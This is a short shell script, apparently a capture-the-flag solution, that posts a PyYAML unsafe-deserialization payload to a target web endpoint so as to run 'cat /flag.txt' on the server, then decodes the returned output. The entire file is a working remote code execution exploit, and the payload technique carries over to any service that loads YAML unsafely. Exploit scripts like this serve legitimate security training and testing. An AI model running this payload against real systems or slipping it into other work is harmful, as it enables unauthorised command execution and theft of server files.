#!/bin/sh
set -e

HOST=${HOST:-192.168.150.1}

printf "!!python/object/new:subprocess.check_output [['cat', '/flag.txt']]" | \
    curl -s -X POST "http://$HOST/people/asd" --data-binary @- | \
    sed -n 2p | \
    awk '{$1=$1};1' | \
    base64 -d
